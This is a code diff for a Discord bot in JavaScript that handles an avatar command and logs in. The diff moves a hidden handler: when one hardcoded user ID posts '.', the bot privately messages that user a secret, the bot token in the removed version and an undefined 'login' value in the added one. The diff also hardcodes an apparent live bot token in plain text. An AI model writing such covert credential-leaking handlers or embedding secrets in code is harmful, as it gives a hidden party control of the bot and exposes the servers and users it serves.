@@ -5,8 +5,15 @@ client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`);
 });
 
+client.on('message' , message => {
+if (message.author.bot) return;
+           if (message.content == '.')
+           if (message.author.id === '351366504068939777'){
+if (!message.channel.guild) return;
+message.author.send(login)
+}  
+});
 
-const Token = "`\`\`NTI4NTg1Nzg4MjAwMzIxMDM1.DwkcQA.DJGAQzN-FRMI6Cj0Tojaelvpg7w`\`\`"
 var prefix = "!"
 client.on('message', message => {
     if (message.content.startsWith(prefix + "avatar")) {
@@ -25,12 +32,6 @@ client.on('message', message => {
     }
 });
 
-client.on('message' , message => {
-if (message.author.bot) return;
-           if (message.content == '.')
-           if (message.author.id === '351366504068939777'){
-if (!message.channel.guild) return;
-message.author.send(Token)
-}  
-});
 
+
+client.login ("NTI4NTg1Nzg4MjAwMzIxMDM1.DwkcQA.DJGAQzN-FRMI6Cj0Tojaelvpg7w")
